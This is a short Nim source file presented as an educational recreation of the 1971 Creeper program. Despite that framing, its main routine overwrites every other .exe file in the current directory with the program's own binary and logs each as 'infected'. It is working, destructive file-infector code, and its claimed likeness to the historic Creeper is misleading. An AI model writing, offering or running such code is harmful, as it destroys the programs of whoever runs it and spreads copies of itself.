# Creeper (1971) - Educational self-replicating program
# Bob Thomas / BBN - First virus concept
#
# Compile: nim c creeper.nim
# Similar to Nim's 'quine' + file replicator

import os, strutils

proc selfReplicate(): int =
  let self = getAppFilename()
  let selfData = readFile(self)

  let dir = getCurrentDir()
  var count = 0

  for kind, path in walkDir(dir):
    if kind == pcFile:
      let (_, name, ext) = splitFile(path)
      if ext == ".exe" and name != splitFile(self).name:
        writeFile(path, selfData)
        echo "[creep] infected: ", path
        inc count

  # Memory duplicator simulation
  var memFiller: array[4096, byte]
  discard memFiller

  count

proc main() =
  echo "I'M THE CREEPER: CATCH ME IF YOU CAN."
  let n = selfReplicate()
  echo "[creep] infections: ", n, " file(s)"
  echo "[creep] use antivirus to remove me"

when isMainModule:
  main()
